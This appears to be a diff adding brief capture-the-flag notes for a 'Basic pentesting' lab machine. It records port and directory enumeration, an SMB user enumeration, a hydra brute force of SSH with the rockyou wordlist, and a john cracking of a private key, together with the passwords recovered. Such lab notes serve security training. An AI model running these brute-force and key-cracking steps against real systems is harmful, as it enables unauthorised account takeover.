@@ -1,0 +1,37 @@
+Basic pentesting
+
+IP: 10.10.229.67
+
+Open ports
+22
+80
+139
+445
+8080
+
+Use dirsearch to get the directory /developement
+
+Brute force the 445 port to get the users:
+
+- the below nmap didnt work
+    nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 -oN nmap/smb-all 10.10.51.73
+- used enum4linux to scan
+    found 2 users named jan and kay
+
+brute force the jan password on ssh using hydra
+- hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.229.67 | tee hydra.log
+- Password found: armando
+
+ssh into the machine
+
+Run linPeas to scan for Previlage Escalation Vectors
+
+Found a private ssh key for kay
+
+ssh key is password protected
+
+Using john the ripper to brute force it 
+- ssh2john kay_id_rsa > kay_id_rsa.hash
+- john --wordlist=/usr/share/wordlists/rockyou.txt kay_id_rsa.hash
+- Found Password : beeswax
+
